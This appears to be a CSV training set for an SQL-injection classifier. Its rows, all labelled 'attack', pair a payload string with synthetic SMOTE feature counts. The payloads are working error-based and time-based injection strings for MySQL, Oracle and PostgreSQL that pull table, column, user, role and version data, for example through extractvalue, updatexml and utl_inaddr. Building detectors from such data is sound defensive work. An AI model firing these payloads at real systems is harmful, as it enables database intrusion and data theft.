id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000102,attack,error,"1"" and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and ""mezx"" like ""mezx",nearest_attack_euclidean,R000168,0.2910740490383112,313.7352589475885,39.73525894758848,4.0771372581693,112.94103579035392,55.0,111.52948210482305,34.26474105241152,0.3599811330472115,0.17530738851348804,0.35549382020850323,0.10921765823079718,0.0,4.0,0.0,-1.3877787807814457e-17,2.0,1.2647410524115195,0.0,20.0,0.0,0.0,6.0,4.2647410524115195,0.0,1.0,-2.7755575615628914e-17,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000103,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000002,0.0,221.0,42.0,4.3919306235717706,123.0,2.0,71.0,25.0,0.5565610859728507,0.009049773755656104,0.3212669683257919,0.11312217194570136,3.0,0.0,0.0,-1.3877787807814457e-17,0.0,3.0,0.0,10.0,0.0,7.0,1.0,3.0,1.0,0.0,-2.7755575615628914e-17,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000104,attack,error,"1""  )   where 5005  =  5005 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",nearest_attack_euclidean,R000197,0.24014593745482546,170.90271244664876,32.0,3.745622728107257,54.0,32.0,64.0,20.902712446648767,0.31597019359755646,0.18724159620595937,0.37448319241191874,0.12230501778456536,0.0,0.9027124466487668,2.0,-1.3877787807814457e-17,0.0,1.0,0.0,13.0,0.0,0.0,4.0,3.0,0.0,0.9027124466487668,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,-2.220446049250313e-16,0.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000105,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000001,0.0,218.0,42.0,4.340822765840235,120.0,2.0,71.0,25.0,0.5504587155963303,0.009174311926605505,0.3256880733944954,0.11467889908256881,3.0,0.0,0.0,-1.3877787807814457e-17,0.0,3.0,0.0,10.0,0.0,6.0,1.0,3.0,1.0,0.0,-2.7755575615628914e-17,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000106,attack,error,select   (  case when   (  5740  =  7636  )   then 5740 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000053,0.0,133.0,29.0,3.7536558766775228,56.0,14.0,51.0,12.0,0.42105263157894735,0.10526315789473684,0.38345864661654133,0.09022556390977443,0.0,0.0,2.0,1.0,0.0,1.0,0.0,8.0,0.0,0.0,0.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000107,attack,error,"1',row  (  7937,5067  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  7937  =  7937,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 9974 union select 5497 union select 8209 union select 8147  )  a group by x  )  ",nearest_attack_euclidean,R000076,0.6612551033214789,294.98386166327947,38.199538904665125,3.965892796574094,99.39216137930717,55.0,107.79354466531179,32.79815561866051,0.3366280933690836,0.18684304704720964,0.36534910763851747,0.11117975194518924,1.5986167139953824,0.0,0.0,-1.3877787807814457e-17,2.0,1.0,0.0,20.399077809330254,0.0,0.0,6.800461095334873,4.0,1.0,0.0,-2.7755575615628914e-17,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,0.19953890466512736,0.19953890466512747,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,12.399077809330254
SMOTE_000108,attack,error,"-2323""  )   as zgsn where 9274  =  9274 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --",nearest_attack_euclidean,R000050,0.6007307857599539,370.3376540169804,34.55843601132028,3.4171792655170443,85.22078199433986,55.33765401698042,168.0,61.77921800566014,0.2301228284927396,0.14941521896862792,0.4536452165500651,0.1668167359885674,0.0,1.0,2.779218005660142,-1.3877787807814457e-17,0.0,3.0,0.0,33.0,0.0,0.0,0.0,25.77921800566014,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,-1.1102230246251565e-16,0.22078199433985846,0.7792180056601417,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000109,attack,error,"-1830""   )    )    as bptv where 4805  =  4805 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --",nearest_attack_euclidean,R000133,1.1518907895811394,440.5309167101347,34.53091671013471,3.494292484038758,111.0,62.0,195.0,72.53091671013472,0.2519690179611165,0.14073945147377678,0.442648274796556,0.16464325576855068,0.0,0.5309167101347114,3.0,-1.3877787807814457e-17,0.0,3.0,0.0,40.0,0.0,0.0,0.0,32.0,0.0,0.5309167101347113,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,0.0,1.0,2.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,8.0
SMOTE_000110,attack,error,"1"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""okpa""  =  ""okpa",nearest_attack_euclidean,R000091,0.25467404104793956,164.61531385911306,29.0,3.825376311663882,48.14461255436452,35.57845021745809,59.31380086983235,21.57845021745809,0.29311919976007683,0.21627577973491602,0.359595573701782,0.13100944680322507,0.0,4.0,0.0,-1.3877787807814457e-17,0.0,1.8553874456354778,0.0,10.578450217458089,0.0,0.0,5.144612554364523,1.8553874456354782,0.0,1.0,-2.7755575615628914e-17,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,-1.1102230246251565e-16,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000111,attack,error,"1'   )    )    as kfnt where 8090  =  8090 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",nearest_attack_euclidean,R000285,0.05170806552318705,185.9760053476455,34.047989304709,3.799711114781984,60.0,32.0,72.0,21.9760053476455,0.3226224841366251,0.17206532487286674,0.3871469809639501,0.11816521002655805,0.976005347645502,0.0,2.0,-1.3877787807814457e-17,0.0,1.0,0.0,14.0,0.0,0.0,4.0,3.0,0.976005347645502,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,-2.220446049250313e-16,0.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000112,attack,error,"1"" and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and ""nzgn""  =  ""nzgn",nearest_attack_euclidean,R000061,0.19173261678674014,314.9090183575455,39.17354712341323,4.045461324699791,110.69418849365292,55.0,114.04128274047937,35.17354712341323,0.35150957459850274,0.1746835087596635,0.3621090445249813,0.11169787211685252,0.0,4.0,0.0,-1.3877787807814457e-17,2.0,1.8264528765867696,0.0,20.34709424682646,0.0,0.0,6.0,4.826452876586769,0.0,1.0,-2.7755575615628914e-17,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000113,attack,error,"1 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  -- btqa",nearest_attack_euclidean,R000240,1.5112205573851716,141.68902909162273,26.581012467838306,3.715599682667493,35.1080166237844,39.0,49.5270041559461,18.054008311892204,0.24758462439073958,0.27541868392937097,0.34967337071619436,0.12732332096369506,0.0,0.0,1.0540083118922043,-1.3877787807814457e-17,0.0,1.0,0.0,10.0,0.0,0.0,6.0,2.054008311892204,0.0,0.0,0.5270041559461022,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,-1.1102230246251565e-16,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000114,attack,error,select   (  case when   (  5740  =  7636  )   then 5740 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000053,0.0,133.0,29.0,3.7536558766775228,56.0,14.0,51.0,12.0,0.42105263157894735,0.10526315789473684,0.38345864661654133,0.09022556390977443,0.0,0.0,2.0,1.0,0.0,1.0,0.0,8.0,0.0,0.0,0.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000115,attack,error,"1""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""mlld"" like ""mlld",nearest_attack_euclidean,R000312,0.9673413147670727,172.80900843087193,28.539338953914623,3.775149851590295,51.966364246530425,34.95495784564033,62.88768633870118,23.0,0.300517383298688,0.2025814425463831,0.36379842312204036,0.13310275103288854,0.0,4.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,12.539338953914623,0.0,0.0,5.460661046085377,1.0,0.0,1.0,-2.7755575615628914e-17,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.7303305230426889,0.0,0.0,-1.1102230246251565e-16,1.7303305230426886,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.2696694769573113,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.7303305230426886
SMOTE_000116,attack,error,"-4032""   )    )    or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   ""olox""  =  ""olox",nearest_attack_euclidean,R000250,0.3692498472050471,376.9685494540744,32.41268972193899,3.319717386466519,85.0,48.0,178.44468778570825,65.52386166836607,0.22593560500908882,0.1275871651816031,0.4726647075152973,0.17381252229401073,0.0,4.0,1.0,-1.3877787807814457e-17,0.0,3.0,0.0,35.52386166836606,0.0,0.0,0.0,24.0,0.0,1.0,-2.7755575615628914e-17,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-1.1102230246251565e-16,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000117,attack,error,"1'  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and   (  'qdhz'  =  'qdhz",nearest_attack_euclidean,R000278,0.01509120906123831,175.16427934479015,31.976531522172838,3.7806112365827444,60.0,24.0,68.14081086696297,23.023468477827162,0.34255913044029,0.137023652176116,0.3889787122077941,0.13143850517579986,4.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,14.023468477827162,0.0,0.0,4.0,1.0,1.0,0.0,-2.7755575615628914e-17,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,-2.220446049250313e-16,0.0,0.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000118,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000012,0.0,254.0,44.0,4.466677692316377,148.0,2.0,77.0,27.0,0.5826771653543307,0.00787401574803151,0.3031496062992126,0.1062992125984252,3.0,0.0,0.0,-1.3877787807814457e-17,0.0,4.0,0.0,10.0,0.0,7.0,1.0,4.0,1.0,0.0,-2.7755575615628914e-17,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.9999999999999998,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
SMOTE_000119,attack,error,"1',exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  7759  =  7759,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",nearest_attack_euclidean,R000219,1.4041417273238568,186.68699412591423,30.460874265739278,3.556091765651712,48.38262279721783,35.28116568765237,77.97247708626128,25.05072855478273,0.257366139756939,0.1893321503358499,0.418649967705493,0.13465174220171813,1.410145710956546,0.0,0.0,-1.3877787807814457e-17,1.0,1.410145710956546,0.0,14.820291421913092,0.0,0.0,4.589854289043454,3.230437132869638,1.0,0.0,-2.7755575615628914e-17,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.410145710956546,0.0,0.410145710956546,1.0,0.410145710956546,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.230437132869638
SMOTE_000120,attack,error,"1'||  (  select 'mgel' where 3591  =  3591 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   ||'",nearest_attack_euclidean,R000234,0.2953848752197528,378.08877844028547,34.822443119429074,3.5670535438369755,95.46732935828723,56.64488623885815,160.24289816399647,65.73366467914362,0.25250330001790544,0.14982135267685853,0.4238158041489389,0.17385954315629715,3.8224431194290744,0.0,0.0,-1.3877787807814457e-17,0.0,3.0,0.0,32.177556880570926,0.0,0.0,0.9112215597145374,26.822443119429074,1.0,0.0,-2.7755575615628914e-17,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,0.0,1.0,0.9112215597145372,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.08877844028546275,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000121,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000012,0.0,254.0,44.0,4.466677692316377,148.0,2.0,77.0,27.0,0.5826771653543307,0.00787401574803151,0.3031496062992126,0.1062992125984252,3.0,0.0,0.0,-1.3877787807814457e-17,0.0,4.0,0.0,10.0,0.0,7.0,1.0,4.0,1.0,0.0,-2.7755575615628914e-17,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.9999999999999998,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
SMOTE_000122,attack,error,"1"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ""onsd"" like ""onsd",nearest_attack_euclidean,R000141,0.01673056838068445,165.86547154546824,29.993885070248556,3.892685462772195,63.908276053728336,24.0,57.975540280994224,19.981655210745664,0.38526538010412226,0.14471338198246161,0.3495541472978533,0.12046709061556293,0.0,3.981655210745667,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,12.0,0.0,0.0,4.0,0.0,0.0,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,-2.220446049250313e-16,0.0,0.0,-1.1102230246251565e-16,0.9938850702485558,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.993885070248556
SMOTE_000123,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000001,0.0,218.0,42.0,4.340822765840235,120.0,2.0,71.0,25.0,0.5504587155963303,0.009174311926605505,0.3256880733944954,0.11467889908256881,3.0,0.0,0.0,-1.3877787807814457e-17,0.0,3.0,0.0,10.0,0.0,6.0,1.0,3.0,1.0,0.0,-2.7755575615628914e-17,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000124,attack,error,"1'  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and   (  'xzlx' like 'xzlx",nearest_attack_euclidean,R000256,0.7837977747178013,314.72190096814404,38.76348288480412,3.9891286367275876,108.97920904166996,55.0,115.68876038725762,35.053931539216464,0.34593986187499054,0.17517302466838747,0.3675133663342263,0.11137374712239563,3.2904486544123475,0.0,0.0,-1.3877787807814457e-17,2.0,1.0,0.0,21.526965769608232,0.0,0.0,6.236517115195884,4.0,1.0,0.0,-2.7755575615628914e-17,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,0.7634828848041157,0.763482884804116,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,13.526965769608232
SMOTE_000125,attack,error,"1'+  (  select 'pvej' where 4496  =  4496 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   +'",nearest_attack_euclidean,R000209,0.02960165236801268,376.05914594809246,38.94085405190759,3.6568359685308085,96.1892670338957,56.952683241526074,158.90536648305215,64.01182918961848,0.25577627738962355,0.15144802018604833,0.42255831233512675,0.1702173900892014,4.0,0.0,0.0,-1.3877787807814457e-17,0.0,3.0,0.0,31.976341620763037,0.0,0.035487568855443685,0.9881708103815188,25.023658379236963,1.0,0.0,-2.7755575615628914e-17,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,0.0,1.0,1.011829189618481,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0118291896184815
SMOTE_000126,attack,error, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT banner FROM v$version WHERE ROWNUM  =  1   )    )    AND 'i'  =  'i,nearest_attack_euclidean,R000028,0.5927185063899488,121.32097295009784,38.10699098336595,4.287721580767853,64.88373872920744,1.7767477458414866,39.66048647504891,15.0,0.5350229973873318,0.014521513146900117,0.3265942131301882,0.12386127633557982,3.0,0.0,0.0,-1.3877787807814457e-17,0.0,2.776747745841486,0.0,4.0,0.0,3.446504508317028,0.0,2.7767477458414866,1.0,0.0,-2.7755575615628914e-17,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.776747745841486,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.776747745841486
SMOTE_000127,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000005,0.0,213.0,40.0,4.192633796617524,117.0,2.0,71.0,23.0,0.5492957746478874,0.009389671361502344,0.3333333333333333,0.107981220657277,3.0,0.0,0.0,-1.3877787807814457e-17,0.0,3.0,0.0,10.0,0.0,4.0,1.0,3.0,1.0,0.0,-2.7755575615628914e-17,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
